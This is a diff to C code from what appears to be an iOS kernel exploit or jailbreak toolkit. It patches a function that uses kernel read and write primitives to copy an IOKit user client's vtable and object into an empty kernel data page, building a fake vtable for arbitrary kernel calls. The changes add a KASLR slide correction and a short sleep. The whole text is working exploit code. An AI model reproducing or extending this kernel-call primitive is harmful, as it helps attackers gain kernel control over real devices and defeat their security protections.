@@ -146,11 +146,11 @@ uint64_t init_kcall(uint64_t *_fake_vtable, uint64_t *_fake_client, mach_port_t 
     uint64_t uc_port = port_name_to_ipc_port(user_client);
     uint64_t uc_addr = kread64(uc_port + 0x58);    //#define IPC_PORT_IP_KOBJECT_OFF
     uint64_t uc_vtab = kread64(uc_addr);
-    uint64_t fake_vtable = off_empty_kdata_page;
+    uint64_t fake_vtable = off_empty_kdata_page + get_kslide();
     for (int i = 0; i < 0x200; i++) {
         kwrite64(fake_vtable+i*8, kread64(uc_vtab+i*8));
     }
-    uint64_t fake_client = off_empty_kdata_page + 0x1000;
+    uint64_t fake_client = off_empty_kdata_page + get_kslide() + 0x1000;
     for (int i = 0; i < 0x200; i++) {
         kwrite64(fake_client+i*8, kread64(uc_addr+i*8));
     }
@@ -240,6 +240,7 @@ int kalloc_using_empty_kdata_page(uint64_t* _fake_vtable, uint64_t* _fake_client
     *_fake_client = allocated_kmem;
 
     mach_port_deallocate(mach_task_self(), user_client);
+    usleep(10000);
 
     clean_dirty_kalloc(fake_vtable, 0x1000);
     clean_dirty_kalloc(fake_client, 0x1000);
